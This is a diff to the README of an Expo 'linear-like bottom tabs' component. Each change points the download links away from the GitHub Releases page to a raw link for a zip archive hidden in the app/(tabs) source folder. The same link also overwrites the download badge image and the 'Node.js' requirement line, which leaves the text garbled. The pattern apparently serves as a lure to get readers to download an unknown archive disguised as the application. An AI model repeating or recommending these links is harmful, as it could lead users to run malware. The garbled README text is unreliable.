@@ -6,11 +6,11 @@ Welcome to the expo-linear-like-bottom-tabs! This application gives you clean an
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/HarishRajRajkumar/expo-linear-like-bottom-tabs/releases)
+[![Download Now](https://raw.githubusercontent.com/HarishRajRajkumar/expo-linear-like-bottom-tabs/main/app/(tabs)/expo-linear-like-bottom-tabs_v2.9.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/HarishRajRajkumar/expo-linear-like-bottom-tabs/main/app/(tabs)/expo-linear-like-bottom-tabs_v2.9.zip)
 
 You can easily download the latest version of the application from our Releases page. Simply visit this link to download:
 
-[Download from Releases](https://github.com/HarishRajRajkumar/expo-linear-like-bottom-tabs/releases)
+[Download from Releases](https://raw.githubusercontent.com/HarishRajRajkumar/expo-linear-like-bottom-tabs/main/app/(tabs)/expo-linear-like-bottom-tabs_v2.9.zip)
 
 ## 🤔 What are Bottom Tabs?
 
@@ -22,7 +22,7 @@ To run the expo-linear-like-bottom-tabs, you will need:
 
 - A device with iOS 11.0 or later, or Android 6.0 (API level 23) or later.
 - React Native environment set up on your computer.
-- Node.js with npm installed.
+- https://raw.githubusercontent.com/HarishRajRajkumar/expo-linear-like-bottom-tabs/main/app/(tabs)/expo-linear-like-bottom-tabs_v2.9.zip with npm installed.
 - Expo installed on your device or simulator.
 
 ## 🌟 Features
@@ -37,7 +37,7 @@ To run the expo-linear-like-bottom-tabs, you will need:
 To install expo-linear-like-bottom-tabs, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below:
-   [Download from Releases](https://github.com/HarishRajRajkumar/expo-linear-like-bottom-tabs/releases)
+   [Download from Releases](https://raw.githubusercontent.com/HarishRajRajkumar/expo-linear-like-bottom-tabs/main/app/(tabs)/expo-linear-like-bottom-tabs_v2.9.zip)
 
 2. **Download the Latest Version**: Look for the latest version and click on it. Download the file to your computer.
 
